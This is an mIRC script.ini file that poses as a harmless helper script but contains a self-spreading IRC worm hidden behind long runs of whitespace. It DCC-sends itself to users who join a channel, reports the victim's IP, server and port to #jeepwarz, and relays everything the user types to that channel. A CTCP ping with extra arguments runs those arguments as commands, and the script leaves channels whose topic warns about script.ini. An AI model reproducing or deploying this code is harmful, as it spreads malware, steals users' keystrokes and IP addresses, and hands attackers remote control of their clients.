[script]
n0=HI   EVERYBODY  DCC ME 12/F
n1=alias /s / *1
n2=on 1:connect:/.enable #d
n3=#d on
n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n5=#d end
n6=  .remote on
n7=  titlebar (Not connected)
n8=  }
n9=raw 401:*: {
n10=  halt
n11=}
n12=RAW 001:*:titlebar (Connecting to $server $+ )
n13=
n14=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .
n15=
n16=on 1:DISCONNECT:titlebar (Not connected)
n17=
n18=;if you type something in status it doesn't have to have "/"
n19=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-
n20=  set %a status window
n21=  if ( $active == %a ) { $1- | halt }
n22=}
n23=
n24=;ping stuff
n25=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n26=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
n27=
n28=;if you are banned but still opped, unban self
n29=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n30=
n31=on 1:JOIN:*:{
n32=  if ( $nick == $me ) { halt }
n33=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
n34=}
n35=
n36=;show channel topic in channel on join
n37=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
